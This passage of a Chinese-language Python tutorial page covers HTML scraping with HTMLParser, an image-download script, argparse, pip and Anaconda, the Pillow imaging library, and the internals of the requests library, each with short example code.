        if tag == 'h3' and ('class','event-title') in attrs:         # 判断标题标签
            self.is_title = True

        if tag == 'span' and ('class','event-location') in attrs:    # 判断地点标签
            self.is_location = True

        if tag == 'span' and ('class','say-no-more') in attrs:       # 判断年份标签
            self.is_year = True

    def handle_data(self, data):                              # 定义数据内容处理器
        if self.is_time == True:                              # 如果标签为时间
            self.is_time = False                              # 初始化时间布尔值
            self.info.append(dict(会议时间=data))              # 把数据储存在info中,下面类似操作标题、地点、年份
        if self.is_title == True:
            self.is_title = False
            self.info.append(dict(会议名称=data))
        if self.is_location == True:
            self.is_location = False
            self.info.append(dict(会议地点=data))
        if self.is_year == True:
            self.is_year = False
            # 由于网页源码中出现是年份标签但显示的内容不是年份,所以增加一个正则表达式来判断
            if re.match(r'[0-9]', data.strip()):
                self.info.append(dict(会议年份=data))

def getinfo(data,u):                                 # 定义信息处理函数
    parser = MyHTMLParser()                        # 创建HTML解析器
    parser.feed(data)                              # 解析HTML文件
    count = 0                                      # 初始化count
    print('抓取网址:%s\n抓取信息如下:' % u)
    for x in parser.info:                          # 打印info
        for key in x :                             # 由于info存的是dict组成的list,所以还要遍历dict
            print(key + ':' + str(x[key]))
        count += 1
        if count % 4 == 0:                         # 当输出四个数据后,打印分割线
            print('-------------------------------')

web = 'https://www.python.org/events/python-events/'
with request.urlopen(web) as f:       # 打开网页
    Data = f.read()
    Data = Data.decode('utf-8')

getinfo(Data,web)                                      # 解析文件并打印信息

</textarea><textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

from html.parser import HTMLParser                    # 引入HTML解析模块
from urllib import request                            # 引入URL请求模块
import re                                             # 引入正则表达式模块
import os
# import gzip, cStringIO

class MyHTMLParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.links = []
        self.pages = 0
        self.ispage = False
    def handle_starttag(self, tag, attrs):
        if tag == "img" and len(attrs) == 3:
            for (variable, value) in attrs:
                if variable == "src" :
                    self.links.append(value)

def down(currentpage, dirname):
    with request.urlopen(currentpage) as f:
        data = f.read()
        html_code = data.decode('gbk')   # gb2312
        hp = MyHTMLParser()
        hp.feed(html_code)
        hp.close()
        for link in hp.links:
            print('to download:', link)
            request.urlretrieve(link, os.path.join(dirname, os.path.split(link)[1]))

base = 'https://www.keke234.com/gaoqing/cn/wfltt/2018/0122/26737.html'

dirname = os.path.join('./img/', base.replace('/', ''))
if not os.path.isdir(dirname):
    os.mkdir(dirname)

down(base, dirname)

for x in list(range(2,15)):
    try:
        cur = base.replace('.html', '_'+str(x)+'.html')
        print('go to page ', cur)
        down(cur, dirname)
    except Exception as e:
        print('done')
        break

</textarea>
</div>

<div id="argparse">
<h4>argparse模块</h4><pre>
argparse是python的标准库,他可以使我们很友好的编写命令行界面,并且可以自动生成帮助文档和使用消息,还能在参数无效的时候发出错误。

argparse.ArgumentParse类参数理解
1. prog：改变应用的名字,可以使用`%(prog)s`引用应用的名字,默认的应用名字为文件名。
2. usage: 显示这个命令用法, 一般用来显示参数的用法
3. description：显示这个命令的帮助信息
4. epilog: 显示命令的帮助信息,位置在参数的下面

argparse.ArgumentParser.add_argument函数理解
1. name | flags: 指定参数的名字
2. action: 指定命令行参数,内置为以下几种
- store: 默认值,仅仅保存参数值。
- store_const: 与store基本一致,但是只保存const关键字指定的值,其它的值会报错
- store_true | store_false: 与store_const基本一致,只保存True和False
- append: 将相同参数的不同值保存在一个list中
- count: 统计参数出现的次数
- help: 输出程序的帮助信息
- version: 输出程序版本信息

3. nargs: 将不同数量的值与一个参数关联起来
- nargs=N:N为整数
- nargs='?'
- nargs='*': 将所有的参数保存在列表中
- nargs='+': 将所有的参数保存在列表中,但是至少得有一个参数
- nargs=argparse.REMAINDER: 其余的参数全部保存在一个list中

4. default: 如果没有传入这个参数,默认使用default参数的值

5. type: 接收到的参数会经过这个参数对应的函数处理。

6. choices: 将参数指定在一个范围内,超出就报错

7. required: 指定参数是否为必传参数。

8. dest: 自定义参数的名称,默认名称为 “- 后面的值” 或者 “-- 后面的值”。

示例：编写ls命令脚本
简单的指定三个参数.
- -a: 添加 -a 参数,显示隐藏文件。
- -r: 添加 -r 参数,递归显示文件夹下面的文件。
- -d: 指定显示目录,如果不指定,默认为当前目录。

</pre><textarea>
# 使用ArgumentParser类来指定参数
import os
import argparse
parser = argparse.ArgumentParser(prog='ls', description='显示文件夹下的文件')

# 指定参数
parser.add_argument('-a', '--all', const=True, nargs='?', help='是否显示隐藏文件')
parser.add_argument('-d', '--directory', help='指定显示的目录,如果不指定,默认为当前目录')
parser.add_argument('-r', '--recursion', const=True, nargs='?', help='是否递归显示')

# 解析参数
args = parser.parse_args()
# 拿到directory参数,如果没有传这个参数,为None
directory = args.directory

# 如果directory有值
if directory:
 # 如果指定目录不存在,抛出异常
 if not os.path.exists(directory):
 raise ValueError(f'{directory} does`t exist')

 # 如果directory不是一个目录,抛出异常
 if not os.path.isdir(directory):
 raise ValueError(f'{directory} is not a directory')

# 如果directory为None,给directory赋值
else:
 directory = '.'

# 规定好参数之后,接下来就是具体ls的实现。封装一个 LsCommand 类
class LsCommand():
 def __init__(self, show_all=False, directory='.', recursion=False):
		'''
		:param show_all: 是否显示隐藏文件
		:param directory: 指定的文件目录
		:param recursion: 是否递归显示目录下的文件
		'''
		self.show_all = show_all
		self.recursion = recursion
		self.directory = os.path.abspath(directory)

 def handle_dir(self, directory, grade=1, placeholder='--'):
		'''
		处理目录
		:param directory: 文件目录
		:param grade: 目录层级
		:param placeholder: 子目录文件前面的占位符
		:return:
		'''
		# 判断是否为文件夹
		# grade是否增加过了
		# os.listdir: 列出当前文件夹下面的所有文件和文件夹
		# 遍历目录下的文件,文件夹
		pass

 def show_file_or_dir(self, file, prefix=''):
		# 如果不显示隐藏文件
		# 打印前缀和文件名
		pass

 def run(self):
		'''
		运行ls命令
		:return:
		'''
		# os.listdir(dir) 得到dir目录下所有文件,文件夹
		# 遍历self.directory目录先所有文件,文件夹
 		pass

# ls类也封装好了,接下来将得到的参数传入 LsCommand 类中,然后运行,就可以愉快的得出结果。
ls = LsCommand(bool(args.all), directory, bool(args.recursion))
ls.run()

# 测试
python ls.py
python ls.py -a -r
python ls.py -d ./temp

</code>


</pre>
</div>

<div id="Third-party">
<h3>第三方模块</h3><pre>
在Python中安装第三方模块是通过包管理工具pip完成的。
Mac或Linux上有可能并存Python 3.x和Python 2.x,因此对应的pip命令是pip3
Windows安装Python确保勾选了pip和Add python.exe to Path,在命令提示符窗口下尝试运行pip,如果Windows提示未找到命令,可以重新运行安装程序添加pip。

一般来说第三方库都会在Python官方的pypi.python.org网站注册,要安装一个第三方库,必须先知道该库的名称,可以在官网或pypi(thePythonPackage Index)上搜索,比如安装Pillow(Python Imaging Library)的命令就是:
pip install Pillow

安装常用模块
在使用Python时经常需要用到很多第三方库,例如Pillow以及MySQL驱动程序、Web框架Flask、科学计算Numpy等。用pip一个一个安装费时费力,还需要考虑兼容性。推荐直接使用Anaconda,这是一个基于Python的数据处理和科学计算平台,它已经内置了许多非常有用的第三方库,装上Anaconda就相当于把数十个第三方模块自动安装好了,非常简单易用。

可以从Anaconda官网下载GUI安装包,安装包有500~600M,所以需要耐心等待下载。网速慢的同学请移步国内镜像。下载后直接安装,Anaconda会把系统Path中的python指向自己自带的Python,并且Anaconda安装的第三方模块会安装在Anaconda自己的路径下,不影响系统已安装的Python目录。

安装好Anaconda后,重新打开命令行窗口,输入python,可以看到Anaconda的信息
可以尝试直接import numpy等已安装的第三方模块

</pre>
</div>

<div id="pillow">
<h4>pillow cv2(pip install opencv-python)处理图片</h4><pre>
cv2用的是BGR,PIL用的是RGB,cv在显示图像时是自定义的显示窗口,而PIL中显示是调用操作系统中的默认打开程序

PIL:Python Imaging Library,已经是Python平台事实上的图像处理标准库了。PIL功能非常强大,但API却非常简单易用。
由于PIL仅支持到Python 2.7,加上年久失修,于是一群志愿者在PIL的基础上创建了兼容版本的Pillow,支持最新Python3.x,又加入了许多新特性,因此可以直接安装使用Pillow。

$ pip install pillow

PIL库可以完成图像归档和图像处理两方面功能需求：
1、图像归档：对图像进行批处理、生成图像预览、图像格式转换等
2、图像处理：图像基本处理、像素处理、颜色处理等

PIL中所涉及到的基本概念包括,(bands)通道,(mode)模式,(coordinate system)坐标系统,(palette)调色板,(filters)过滤器
每张图像都是由一个或多个数据通道构成,PIL可以在单张图片中合成相同维数和深度的多个通道,如RGB有三个通道,而灰度图像则只有一个通道

图像实际上是像素数据的矩形图,图像的模式定义了图像中像素的类型和深度,它在图像中定义mode模式的概念,如：
1:1位像素,表示黑和白,占8bit,在图像表示中称为位图
L：表示黑白之间的灰度,占8bit像素
p：8位像素,使用调色版映射
RGB：为真彩色,占用3x8位像素,三原色叠加形成的色彩变化,如三通道都为0则代表黑色,都为255则代表白色
RGBA：为带透明蒙版的真彩色,其中的A为alpha透明度,占用4x8位像素
CMYK: 打印分色

PIL使用笛卡尔像素坐标系统,图像的坐标从左上角开始(0,0),坐标值表示像素的角,它实际上位于(0.5,0.5);python中坐标通常以2元组(X,Y)的形式传递,矩形表示为4元组(l_x,t_y,r_x,b_y),X轴从左到右,Y轴从上到下,顺序是从左上右下表示,从左上角开始,如一个800X600像素的图像矩形表示为(0,0,800,600),它实际上时左上角锁定,向右下延伸的。

【 Image类方法 图像模块 】
在PIL中任何图像文件都可以用Image对象表示

im = Image.open(file, mode)
读取图像文件头,mode只能是'r'

</pre><pre><code class="language-python">
from PIL import Image
import numpy as np
import pandas as pd
print(np.array(Image.open('dog.jpg')))

</textarea><pre>
Image.new(mode,size,color)：
使用给定的模式、大小和颜色创建新图像;大小以(宽度,高度)元组的形式给出,以像素为单位;颜色以单波段图像的单个值和多波段图像的元组(每个波段的一个值)给出,可以使用颜色名如'red'也可以受用16进制#FF0000或者使用数字表示(255,0,0)

</pre><textarea>
from PIL import Image

#这三种效果一样,都为分辨率1920x1080的红色图像
im = Image.new('RGB',(1920,1080),(255,0,0))
im1 = Image.new('RGB',(1920,1080),'red')
im2 = Image.new('RGB',(1920,1080),'#FF0000')
im.show()
im1.show()
im2.show()

</textarea><pre>
Image.blend(image1,image2,alpha)
通过使用常量alpha在给定图像之间进行差值来创建新图像,两个图像必须具有相同的大小和模式,aplha为0则返回第一张图像的拷贝,为1则返回第二张图像的拷贝,可以去中间值来划分偏差如0.5

</pre><textarea>
from PIL import Image

image1=Image.new('RGB',(1920,1080),(0,0,255))  #蓝色图像
image2=Image.new('RGB',(1920,1080),(255,0,0))  #红色图像
im=Image.blend(image1,image2,0.5)  #取中间值
image1.show()
image2.show()
im.show()  #显示紫色图像,因为红色叠加蓝色会调和成紫色
im.save('5555.jpg')

</textarea><pre>
Image.composite(image1,image2,mask)通过给定的图像之间进行差值,使用mask图像的响应像素作为alpha来创建新图像,mask可以具有的模式'1','L'或'RGBA'

</pre><textarea>
image1=Image.new('RGB',(1920,1080),(0,0,255))  #蓝色图像
image2=Image.new('RGB',(1920,1080),(255,0,0))  #红色图像
image3=Image.new('L',(1920,1080),125)  #灰色

im=Image.composite(image1,image2,mask=image3)
image1.show()
image2.show()
image3.show()
im.show()
im.save('5555.jpg')

</textarea><pre>
Image.eval(image,function)
function为接受一个整数参数的函数,将im的每个像素值分别传给func处理并返回最后的Image对象

</pre><textarea>
from PIL import Image

im = Image.open('31.gif')
evl = Image.eval(im,lambda x:x/2)  #将每个像素除以2
evl.show()

</textarea><pre>
Image.merge(mode,bands)
从多个单通道创建新图像,bands为图像的元组或列表

</pre><textarea>
from PIL import Image

im1=Image.open('1.jpg').resize((1024,768),Image.ANTIALIAS) #type:Image.Image
im2=Image.open('2.jpg').resize((1024,768),Image.ANTIALIAS) #type:Image.Image
im3=Image.open('5555.jpg').resize((1024,768),Image.ANTIALIAS) #type:Image.Image
im1_rgb=im1.split()
im2_rgb=im2.split()
im3_rgb=im3.split()
rgbs=[im1_rgb[0],im2_rgb[1],im3_rgb[2]] #使用三个图像的单通道
im_merge=Image.merge('RGB',rgbs) #合成一张新图像
im_merge.show()
print(im_merge.size,im_merge.mode)

</textarea><pre>
【 Image类实例方法 】
im.show()
显示图像

im.format属性:图像源文件的文件格式,如果图像不是从文件打开的,那么该属性值为None
im.mode属性:图像模式,典型值为"1","L","RGB"或"CMYK",L为灰度图,RGB为真彩色,CMYK为pre-press图像
im.size属性:图像大小,以像素为单位。大小以2元组tuple(宽度,高度)给出,表示图像的宽和高
im.palette属性:调色板表
im.info属性:保存与图像相关的数据的字典

</pre><textarea>
from PIL import Image
from io import BytesIO
import requests

#打开文件或从文件流中打开图像
im = Image.open("plt.png")

r=requests.get('http://image.jpg')
im=Image.open(BytesIO(r.content))

print(im.format, im.size, im.mode, im.palette, im.info)
# PNG (640, 480) RGBA None {'dpi': (100, 100), 'Software': 'matplotlib version3.1.1, http://matplotlib.org/'}
im.show()

</textarea><pre>
im.save(outfile,format,options)
将图像保存在给定的文件名下

</pre>将图像转换为PNG<textarea>
from PIL import Image
im=Image.open('images/22.jpg','r')
im.save('images/33.png')
#im.show()
im_png=Image.open('images/33.png','r')
print(im_png.format)

</textarea><pre>
im.thumbnail(size)
修改图像以包含其自身的缩略图版本

</pre><textarea>
from PIL import Image

size=(128,128)
im=Image.open('images/31.gif')
print(im.size)             # (275, 434)
im.thumbnail(size)         # 根据图像的宽高比例缩小,以最大的值为标准
im.save('images/55.gif','GIF')
print(im.size,im.format)   # (81, 128) GIF

</textarea><textarea>
from PIL import Image
im = Image.open("plt.png")
w, h = im.size                                  # 获得图像尺寸
print('Original image size: %sx%s' % (w, h))
im.thumbnail((w//2, h//2))                      # 缩放到50%
print('Resize image to: %sx%s' % (w//2, h//2))
im.save('thumbnail.jpg', 'jpeg')                # 把缩放后的图像用jpeg格式保存

</textarea>批量创建缩略图脚本,在文件夹下批量创建128x128的缩略图<textarea>
from PIL import Image
import glob,os

size=128,128
for infile in glob.glob('D:\image\*.jpg'):
    filename=os.path.split(infile)[-1]
    im=Image.open(infile)
    im.thumbnail(size,Image.ANTIALIAS)
    im.save("E:\images\\"+filename)   #注意保存图像时按照比例缩放保存的,以最大像素为依据比例缩小

</textarea><pre>
im.resize(size,filter=None)
图像缩放,返回图像的已调整大小的副本
im = im.resize((100,100)) #参数表示图像的新尺寸, 分别表示宽度和高度

</pre><textarea>
from PIL import Image

#filter为滤波器：将多个输入像素映射为一个输出像素的几何操作,PIL提供的采样滤波器：
#NEAREST：最近滤波。从输入图像中选取最近的像素作为输出像素。它忽略了所有其他的像素
#BILINEAR：双线性滤波。在输入图像的2x2矩阵上进行线性插值,,做下采样时该滤波器使用了固定输入模板
#BICUBIC：双立方滤波。在输入图像的4x4矩阵上进行立方插值,做下采样时该滤波器使用了固定输入模板
#ANTIALIAS：平滑滤波,对所有可以影响输出像素的输入像素进行高质量的重采样滤波,以计算输出像素值,这个滤波器只用于改变尺寸和缩略图方法
#ANTIALIAS滤波器是下采样,将大图转换为小图或左缩略图时唯一正确的滤波器,BILIEAR和BICUBIC滤波器使用固定的输入模板,用于固定比例的几何变换和上采样是最好的

im=Image.open('1.jpg') #type:Image.Image
print(im.size)
img1=im.resize((1024,768),Image.BILINEAR)
img2=im.resize((1024,768),Image.BICUBIC)
img3=im.resize((1024,768),Image.ANTIALIAS)
img4=im.resize((1024,768),Image.NEAREST)
im.show()
img1.show()
img2.show()
img3.show()
img4.show()

</textarea><pre>
im.convert(mode)
将图像转换为另一种模式,然后返回新图像
convert()是图像实例对象的一个方法,接受一个mode参数用以指定一种色彩模式,mode的取值：
· 1 (1-bit pixels, black and white, stored with one pixel per byte)
· L (8-bit pixels, black and white)
· P (8-bit pixels, mapped to any other mode using a colour palette)
· RGB (3x8-bit pixels, true colour)
· RGBA (4x8-bit pixels, true colour with transparency mask)
· CMYK (4x8-bit pixels, colour separation)
· YCbCr (3x8-bit pixels, colour video format)
· I (32-bit signed integer pixels)
· F (32-bit floating point pixels)

im = Image.open('1.png').convert('L')

</pre>转换图像文件格式<textarea>
def img2jpg(imgFile):
     if type(imgFile)==str and imgFile.endswith(('.bmp', '.gif', '.png')):
          with Image.open(imgFile) as im:
              im.convert('RGB').save(imgFile[:-3]+'jpg')

img2jpg('1.gif')
img2jpg('1.bmp')
img2jpg('1.png')

</textarea><pre>
im.getbands()
返回包含每个band的名称的元组。例如RGB图像上的getband返回("R","G","B")

</pre><textarea>
from PIL import Image
im=Image.open('1.jpg')
im1=Image.new('L',(1080,1050),100)
assert isinstance(im,Image.Image)
print(im1.getbands())  # ('L',)
print(im.getbands())   # ('R', 'G', 'B')
im1.show()

</textarea><pre>
im.copy()
拷贝图像

im.paste(image,box)
将另一张图像粘贴到此图像中

im.crop(box)
从当前图像返回矩形区域的副本,box是一个4元祖,定义从左、上、右、下的像素坐标

</pre><textarea>
#剪切图像
box=(100,100,400,400) #定义了图像的坐标位置,从左、上、右、下
im=Image.open('images/22.jpg','r')
print(im.size)
region=im.crop(box)  #它会从左上角开始,同时向下和向右移动100像素的位置开始截取400-100的像素宽高,也就是300x300的图像
print(region.size)
region.save('images/300x300.jpg')

# 图像裁剪与粘贴
box = (120, 194, 220, 294) #定义裁剪区域
region = im.crop(box) #裁剪
region = region.transpose(Image.ROTATE_180)
im.paste(region,box) #粘贴

</textarea><pre>
im.rotate(angle)
返回围绕其中心逆时针旋转给定度数的图像副本

</pre><textarea>
from PIL import Image

image1=Image.open('1.jpg')
img1=image1.resize((1680,1050)) #返回跳转图像尺寸的副本
img1.show()
img2=img1.rotate(90)   #逆时针旋转图像90度
img2.show()

</textarea><pre>
im.transpose(method)
返回图像的翻转或旋转副本

</pre><textarea>
from PIL import Image

#剪切和粘贴图像
box=(100,100,400,400) # 定义了图像的坐标位置,从左、上、右、下
im=Image.open('images/162.jpg')
print(im.size)
region=im.crop(box)  #它会从左上角开始,同时向下和向右移动100像素的位置开始截取400-100的像素宽高,也就是300x300的图像
print(region.size)
#region.save('images/500x500.jpg')

region_tran180=region.transpose(Image.ROTATE_180) #旋转图像180度

im.paste(region_tran180,box)  #按照像素比例粘贴回去

</textarea><pre>
im.filter(filter)
返回由给定过滤器过滤的图像的副本

from PIL import Image, ImageFilter
im = Image.open('1.png')
im.filter(ImageFilter.GaussianBlur) # 高斯模糊
im.filter(ImageFilter.BLUR) # 普通模糊
im.filter(ImageFilter.EDGE_ENHANCE) # 边缘增强
im.filter(ImageFilter.FIND_EDGES) # 找到边缘
im.filter(ImageFilter.EMBOSS) # 浮雕
im.filter(ImageFilter.CONTOUR) # 轮廓
im.filter(ImageFilter.SHARPEN) # 锐化
im.filter(ImageFilter.SMOOTH) # 平滑
im.filter(ImageFilter.DETAIL) # 细节

</pre><textarea>
from PIL import Image, ImageFilter
im = Image.open('plt.png')
im2 = im.filter(ImageFilter.BLUR)   # 应用模糊滤镜
im2.show()

</textarea><pre>
im.split()
返回图像中各个图像带的元组

</pre><textarea>
from PIL import Image
im=Image.open('plt.png')
assert isinstance(im,Image.Image)
source=im.split()  #分隔RGB三通道颜色的副本
print(source)
source[0].show()
source[1].show()
source[2].show()

# (< PIL.Image.Image image mode=L size=640x480 at 0x7F5FF33682E8>, < PIL.Image.Image image mode=L size=640x480 at 0x7F5FF3368E80>, < PIL.Image.Image image mode=L size=640x480 at 0x7F5FF336F320>, < PIL.Image.Image image mode=L size=640x480 at 0x7F5FF336F358>)

</textarea><pre>
im.seek(frame)
寻找序列文件中的给定帧

im.tell()
返回当前帧编号

im.verify()
尝试确定文件是否损坏,而不实际解码图像数据

</pre><pre>
im.getbbox()
计算图像中非零区域的边界框

</pre><textarea>
from PIL import Image
im=Image.open('1.jpg')
im1=Image.new('L',(1080,1050),100)
assert isinstance(im,Image.Image)
print(im.getbbox())  # (0, 0, 1229, 768)
print(im1.getbbox()) # (0, 0, 1080, 1050)

</textarea><pre>
im.getcolors(maxcolors)
返回元祖的末排序列表

</pre><textarea>
from PIL import Image
im=Image.open('1.jpg')
im1=Image.new('L',(1080,1050),100)
assert isinstance(im,Image.Image)
print(im.getcolors())  # None
print(im1.getcolors()) #返回计数和颜色的元组 # [(1134000, 100)]

</textarea><pre>
im.getdata()
返回图像的像素值列表,将图像的内容作为包含像素值的序列对象返回

im.getextrema()
返回包含图像最小值和最大值的2元组,仅适用于单波段图像

im.getpixel(xy)
返回给定位置的像素,多层图像则返回元组

</pre><textarea>
from PIL import Image

im=Image.open('1.jpg')
im1=Image.new('L',(1080,1050),100)
print(list(im.getdata()))  # 14, 233), (205, 210, 229), (209, 212, 229)......
print(im.getextrema()) # ((0, 255), (0, 255), (0, 255))
print(im.getpixel((15,15))) # (10, 59, 76)

</textarea><pre>
im.load()
映像分配存储并从文件加载它

im.histogram()
查看图像直方图

im.point(table)
返回图像的副本,其中每个像素已通过给定的查找表进行映射

</pre><textarea>
from PIL import Image

im=Image.open('1.jpg')
assert isinstance(im,Image.Image)
#调整灰色图像的对比度
im_point=im.convert('L').point(lambda i:i < 80 and 255)
im_point.show()
source=im.split()
#三通道分别处理对比度
mask_r=source[0].point(lambda i:i < 80 and 255)
mask_g=source[1].point(lambda i:i < 80 and 255)
mask_b=source[2].point(lambda i:i < 80 and 255)
mask_r.show()
mask_g.show()
mask_b.show()

</textarea><pre>
【 ImageDraw类 】
PIL的ImageDraw提供了一系列绘图方法,可以直接绘图

</pre>生成字母验证码图片<textarea>
from PIL import Image, ImageDraw, ImageFont, ImageFilter
import random

# 随机字母
def rndChar():
    return chr(random.randint(65, 90))

# 随机颜色1:
def rndColor():
    return (random.randint(64, 255), random.randint(64, 255), random.randint(64, 255))

# 随机颜色2:
def rndColor2():
    return (random.randint(32, 127), random.randint(32, 127), random.randint(32, 127))

width = 60 * 4
height = 60
image = Image.new('RGB', (width, height), (255, 255, 255))
# 创建Font对象
font = ImageFont.truetype('Arial.ttf', 36)
# 创建Draw对象
draw = ImageDraw.Draw(image)
# 填充每个像素
for x in range(width):
    for y in range(height):
        draw.point((x, y), fill=rndColor())
# 输出文字:
for t in range(4):
    draw.text((60 * t + 10, 10), rndChar(), font=font, fill=rndColor2())
# 模糊:
image = image.filter(ImageFilter.BLUR)
image.save('code.jpg', 'jpeg')

</textarea><pre>
【 ImageGrab类 】
ImageGrab.grab() ⇒ image
ImageGrab.grab(bbox) ⇒ image
抓取当前屏幕的快照,返回一个RGB模式的图像。参数边界框用于限制只拷贝当前屏幕的一部分区域

</pre>截屏<textarea>
from PIL import ImageGrab

im = ImageGrab.grab((0,0,800,200)) # 截取屏幕指定区域的图像
im = ImageGrab.grab() # 全屏截取
im.save("screenshot.jpg")
print(im.size, im.mode, img.getdata())
im.show()

</textarea><textarea>
import numpy as np
from PIL import ImageGrab

img = ImageGrab.grab(bbox=(100,161,1141,610))
img = np.array(img.getdata(), np.uint8).reshape(img.size[1], img.size[0], 3)

</textarea><pre>
Grabclipboard
ImageGrab.grabclipboard() ⇒ image or list of strings or None
抓取当前剪贴板的快照,返回一个RGB模式的图像或文件名称的列表,如果剪贴板不包括图像数据则返回空。
用户可以使用函数isinstance()来检查该函数返回的是一个有效图像对象或其他数据

</pre><textarea>
from PIL import Image, ImageGrab
im = ImageGrab.grabclipboard()

if isinstance(im, Image.Image):
    print(im.size, im.mode)
    im.save("D:\\Document\\mdoc\\python\\pic\\12\\grab_grabclipboard.jpg")
elif im:
    for filename in im:
        try:
            print(filename)
            im = Image.open(filename)
        except IOError:
            pass #ignore this file
        else:
            print(im.size, im.mode)
else:
    print("clipboard is empty")

</textarea><pre>
【 ImageEnhance类 】

图像对比度增强
from PIL import Image
from PIL import ImageEnhance

#原始图像
image = Image.open('lena.jpg')
image.show()

#亮度增强
enh_bri = ImageEnhance.Brightness(image)
brightness = 1.5
image_brightened = enh_bri.enhance(brightness)
image_brightened.show()

#色度增强
enh_col = ImageEnhance.Color(image)
color = 1.5
image_colored = enh_col.enhance(color)
image_colored.show()

#对比度增强
enh_con = ImageEnhance.Contrast(image)
contrast = 1.5
image_contrasted = enh_con.enhance(contrast)
image_contrasted.show()

#锐度增强
enh_sha = ImageEnhance.Sharpness(image)
sharpness = 3.0
image_sharped = enh_sha.enhance(sharpness)
image_sharped.show()

</pre><pre>
【 ImageChops模块 】
ImageChops模块包含多个算术图像的通道操作,它们可以实现特殊效果,图像合成,算法绘画等
它的功能大多数通道操作都是采用一个或两个图像参数比较来返回一个新图像

IC.lighter(image1,image2)
逐个像素地比较两个图像,并返回包含较亮值的新图像

</pre><textarea>
from PIL import Image
from PIL import ImageChops
im1=Image.open('1.jpg')
im2=Image.open('2.jpg')

IC_image=ImageChops.lighter(im1,im2)
IC_image.show()

</textarea><pre>
IC.darker(image1,image2)
逐个像素地比较两个图像,并返回包含较暗值的新图像

IC.difference(image1,image2)
返回两个图像之间差异的绝对值

IC.multiply(image1,image2)
将两个图像叠加在一起。如果将图像与纯黑色图像相乘,则结果为黑色。如果乘以纯白图像,则图像不受影响

IC.screen(image1,image2)
将两个倒置的图像叠加在一起

IC.add(image1,image2,scle,offset)
添加两个图像,按比例划分结果并添加偏移量

IC.subtract(image1,image2,scale,offset)
减去两个图像,按比例划分结果并添加偏移量

【 ImageColor模块 】
ImageColor模块用来实现RGB颜色表转换,它支持是颜色格式包括：
十六进制颜色说明符,例如"＃ff0000"指定纯红色
RGB函数,以"rgb(红色,绿色,蓝色)"给出,其中颜色值是0到255范围内的整数,如"rgb(255,0,0)"和"rgb(100％,0％,0％)
常见的HTML颜色名称,例如"red"指定纯红色

getrgb(color)
将颜色字符串转换为RGB元组

getcolor(color,mode)
与getrgb相同,但如果模式不是颜色或调色板图像,则将RGB值转换为灰度值

</pre><textarea>
from PIL import ImageColor
IC_image=ImageColor.getrgb('red')
print(IC_image)  # (255, 0, 0)

</textarea>demo: 图片转TxT工具<textarea>
# 原理是打开一幅图片, 先对图片进行格式转换个缩放, 然后对图像二值化, 转换成纯黑白的图像, 接着依次读取图片每个像素的值写入到文本文件中, 如果该值不为0则写入 @ ,否则写入 空格

from PIL import Image #导入Image库用与操作图片文件
import datetime
def image_to_txt(imgName):
    timestr = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") #获取当前时间,转换成字符串
    namestr = "{0}-{1}.txt".format(imgName, timestr)                #生成的Txt文件用<原图片文件名+ 当前时间字符串+ ".txt"后缀>作为文件名
    txt = open(namestr, "w+")     #打开或创建一个TxT文件文件
    print("Open Image File [{0}]".format(imgName))
    try:
        img = Image.open(imgName) #打开图片文件文件
    except:
        print("Error to Open [{0}]!!!".format(imgName))
    #判断图片文件的格式, 这里必须为"RGB"格式, 如果不是"RGB"格式,则用convert函数转换成"RGB"格式.
    if "RGB" == img.mode:
        print("Size{0},Format({1}),Color({2})".format(img.size, img.format, img.mode))
    else:
        print("Not a RGB image file!!!")
        img = img.convert("RGB")
        print("Convert to RGB Success!!!")
    #获取图片文件宽和高
    width, height = img.size[0], img.size[1]
    zoom = 0
    maxsize = max(width, height) #如果图片文件大于 400*400像素,则对图片进行缩放,缩放比例依照宽度和高度中的最大值
    if maxsize >= 400:
        zoom = maxsize / 400
        width = int(width / zoom)
        height = int(height / zoom)
        img = img.resize((width, height))
        print("Image Size too large, Resize to", img.size)
    img = img.convert("1") #把图片文件转换成纯黑白的图片
    index = 0
    print("Start Process!")
    for w in range(width): #遍历图片的宽度,[0, width)
        index += 1         #显示处理进度
        print("#", end="")
        txt.write("/*")
        if index >= 60:    #大于60换行
            index = 0
            print("")
        for h in range(height):          #遍历图片的高度[0, height)
            pixel = img.getpixel((w, h)) #获取图片当前坐标点的像素值
            if pixel != 0:               #因为是纯黑白图像,所以像素颜色只有0或255两种值
                txt.write("_")           #非0则往txt中写入"_"表示白色
            else:
                txt.write("@")#0则往txt中写入"@"表示黑色
        txt.write("*/")
        txt.write("\n")
    #保存新生成的TXT文件
    print("\nProcess Done!")
    print("Save File As [{0}]".format(namestr))
    txt.close()
    print("Save Done!")
name = input("Please Input Image File Name:")
print("Start......")
try:
    image_to_txt(name)
except:
    print("Error!!!!!!")
print("Over......")

</textarea>
</div>

<div id="requests">
<h4>requests </h4><pre>
快速获取请求参数：浏览器network面板选择文件右键copy->copy as curl,然后粘贴到Postman自动生成python代码

Python内置的urllib模块用于访问网络资源,但用起来麻烦,而且缺少很多实用的高级功能,更好的方案是使用Python第三方库requests

$ pip3 install requests

Requests允许发送HTTP/1.1请求,无需手工劳动,不需要手动为URL添加查询字串,也不需要对POST数据进行表单编码。Keep-alive和HTTP连接池的功能是完全自动化的,一切动力都来自于Requests内部的urllib3

Keep-Alive&连接池
国际化域名和URL
带持久Cookie的会话
浏览器式的SSL认证
自动内容解码
基本/摘要式的身份认证
优雅的key/value Cookie
自动解压
Unicode响应体
HTTP(S)代理支持
文件分块上传
流下载
连接超时
分块请求
支持.netrc

【 requests源码 】
__init__.py 中import 其他py文件的方法
requests的使用只需要import之后,直接调用get、post、put、delete、requests等方法
模块仅对外暴露方法,简化外部调用,而不是封装成类,调用前还要实例化
api中request方法在模块内实例化一个Session类对象,用上下文管理器with调用Session实例对象的request方法并返回。

api.py实现了基本的对外接口,即get,post,delete等http方法名命名的一系列函数,实际上这些方法是通过调用更为通用的request方法来实现的,request方法的是通过sessions.Session()来实现的,但其实requests提供的基本http方法底层也是通过session实现
的,只不过每一个基本方法调用完这个session就结束了,其相关的资源(包括连接,cookies等)也就
释放了。

session.py
requests模块的get,post等方法最终调用的都是Session类的request方法,在Session类request方法中,首先创建Request类实例对象,将实例对象作为参数创建了一个PreparedRequest类实例,再将PreparedRequest类实例作为参数,调用了Session类send方法,。在Session类send方法中,创建HTTPAdapater适配器、调用HTTPAdapater的send方法,处理cookies,hooks,redirects等问题,返回Response响应对象
